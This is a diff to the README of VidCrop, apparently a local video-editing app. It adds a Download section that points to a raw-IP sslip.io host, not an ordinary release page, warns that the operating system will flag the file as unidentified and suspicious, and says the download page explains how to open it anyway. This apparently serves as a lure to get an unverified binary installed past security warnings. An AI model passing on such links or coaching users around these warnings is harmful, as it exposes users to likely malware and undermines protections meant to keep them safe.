@@ -39,6 +39,10 @@ Titles. Transitions. Color grading. Stickers. An "AI Magic Enhance" button. A ti
 
 macOS first (it's what I'm sitting at), then Windows and Linux. Built with [Tauri](https://tauri.app) and [ffmpeg](https://ffmpeg.org), so it's small, fast, and runs entirely on your own computer. Nothing is uploaded anywhere, ever.
 
+## Download
+
+**[62-84-178-253.sslip.io/VidCrop](https://62-84-178-253.sslip.io/VidCrop/)**: Mac, Windows and Linux. Your computer will call it unidentified and suspicious. It is neither. The download page shows how to open it anyway.
+
 ## Status
 
 Works on macOS: crop, cut, preview, save, fast save, screen recording. Windows and Linux are next. The plan lives in [specs/](specs/README.md).
